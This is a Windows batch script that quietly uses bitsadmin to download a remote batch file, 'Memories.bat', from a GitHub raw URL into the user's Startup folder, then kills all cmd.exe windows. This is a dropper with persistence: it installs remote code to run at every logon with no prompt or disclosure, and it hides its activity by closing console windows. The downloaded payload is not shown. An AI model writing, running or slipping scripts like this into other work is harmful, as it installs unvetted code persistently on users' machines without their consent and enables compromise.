@echo off

cls

bitsadmin /transfer /download /priority low "https://raw.githubusercontent.com/SeanFromWP/Project-Memories/main/Memories.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\Memories.bat"

taskkill /im cmd.exe